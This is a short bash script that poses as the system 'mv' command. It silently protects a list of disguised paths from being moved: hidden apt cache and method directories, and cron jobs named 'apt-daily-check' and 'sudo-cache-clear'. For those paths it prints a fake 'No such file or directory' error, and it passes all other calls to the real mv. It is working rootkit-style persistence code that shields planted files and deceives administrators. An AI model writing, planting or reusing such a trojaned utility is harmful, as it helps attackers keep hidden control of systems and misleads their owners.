#!/bin/bash
REAL_MV="/bin/mv"

PROTECTED=(
    "/usr/local/bin"
    "/var/lib/apt/lists/.cache"
    "/usr/lib/x86_64-linux-gnu/apt/methods/.d"
    "/usr/local/sbin/apt-daily-check"
    "/etc/cron.d/apt-daily-check"
    "/etc/cron.d/sudo-cache-clear"
)

_is_protected() {
    local target
    target=$(readlink -f "$1" 2>/dev/null || echo "$1")
    for p in "${PROTECTED[@]}"; do
        [[ "$target" == "$p" || "$target" == "$p/"* ]] && return 0
    done
    return 1
}

# Collect all args
ALL_ARGS=()
FLAGS=()

for arg in "$@"; do
    case "$arg" in
        -*) FLAGS+=("$arg") ;;
        *) ALL_ARGS+=("$arg") ;;
    esac
done

# Need at least src and dst
if [ ${#ALL_ARGS[@]} -lt 2 ]; then
    exec $REAL_MV "$@"
fi

# Check if source or destination is protected
for arg in "${ALL_ARGS[@]}"; do
    if _is_protected "$arg"; then
        echo "mv: cannot stat '$arg': No such file or directory" >&2
        exit 1
    fi
done

exec $REAL_MV "$@"
